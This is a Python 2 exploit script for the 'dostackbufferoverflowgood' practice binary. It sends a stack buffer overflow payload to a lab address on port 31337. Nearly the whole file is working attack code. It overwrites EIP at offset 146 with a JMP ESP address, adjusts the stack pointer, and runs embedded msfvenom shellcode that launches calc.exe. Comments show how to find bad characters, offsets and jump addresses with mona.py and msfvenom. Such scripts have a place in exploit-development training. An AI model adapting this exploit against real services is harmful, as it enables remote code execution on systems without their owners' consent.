#! /usr/bin/env python2

import socket
import struct
import sys

print "//dostackbufferoverflowgood exploitation script//"
print "\n"
print "/////////////////////////////////////////////////"


addr = "192.168.30.142"
port = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr,port))

#bad chars can be found by printing all hex from 0x00 - 0xFF to a file and comparing it with all hex sent to esp with !mona cmp -a esp -f C:\badchars.txt (file from writing)

#badchars for msfvenom : '\00\01\0A', shell code generated with #msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread (as to not break the server after shellcode execution)
shellcalc =  b""
shellcalc += b"\xdb\xc2\xd9\x74\x24\xf4\x5a\x2b\xc9\xb8\xaa"
shellcalc += b"\x3f\x44\xbd\xb1\x31\x83\xc2\x04\x31\x42\x14"
shellcalc += b"\x03\x42\xbe\xdd\xb1\x41\x56\xa3\x3a\xba\xa6"
shellcalc += b"\xc4\xb3\x5f\x97\xc4\xa0\x14\x87\xf4\xa3\x79"
shellcalc += b"\x2b\x7e\xe1\x69\xb8\xf2\x2e\x9d\x09\xb8\x08"
shellcalc += b"\x90\x8a\x91\x69\xb3\x08\xe8\xbd\x13\x31\x23"
shellcalc += b"\xb0\x52\x76\x5e\x39\x06\x2f\x14\xec\xb7\x44"
shellcalc += b"\x60\x2d\x33\x16\x64\x35\xa0\xee\x87\x14\x77"
shellcalc += b"\x65\xde\xb6\x79\xaa\x6a\xff\x61\xaf\x57\x49"
shellcalc += b"\x19\x1b\x23\x48\xcb\x52\xcc\xe7\x32\x5b\x3f"
shellcalc += b"\xf9\x73\x5b\xa0\x8c\x8d\x98\x5d\x97\x49\xe3"
shellcalc += b"\xb9\x12\x4a\x43\x49\x84\xb6\x72\x9e\x53\x3c"
shellcalc += b"\x78\x6b\x17\x1a\x9c\x6a\xf4\x10\x98\xe7\xfb"
shellcalc += b"\xf6\x29\xb3\xdf\xd2\x72\x67\x41\x42\xde\xc6"
shellcalc += b"\x7e\x94\x81\xb7\xda\xde\x2f\xa3\x56\xbd\x25"
shellcalc += b"\x32\xe4\xbb\x0b\x34\xf6\xc3\x3b\x5d\xc7\x48"
shellcalc += b"\xd4\x1a\xd8\x9a\x91\xc5\x3a\x0f\xef\x6d\xe3"
shellcalc += b"\xda\x52\xf0\x14\x31\x90\x0d\x97\xb0\x68\xea"
shellcalc += b"\x87\xb0\x6d\xb6\x0f\x28\x1f\xa7\xe5\x4e\x8c"
shellcalc += b"\xc8\x2f\x2d\x53\x5b\xb3\x9c\xf6\xdb\x56\xe1"

#msfvenom shellcode above contains badchar fix that breaks esp, which will contain the shellcode, so subtract esp by x10 to get "expand it" and get the shellcode far from the destruction point #metasm > sub esp, 0x10
fix_esp = "\x83\xec\x10"

#can be founed with msfvenom pattern/offset modules
eip_offset = 146

#fixed length to make sure everything is consistent
buf_len = 1024

#jmpesp can be found with mona.py in debugger #mona jmp -r esp - cpb "~bad chars~"
jmpesp_addr = 0x080414c3

buf = ""
buf += "A"*146
buf += struct.pack("<I",jmpesp_addr)
buf += fix_esp
buf += shellcalc
buf += "C"*(buf_len-len(buf))
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

print "Recieved: {0}".format(s.recv(1024))



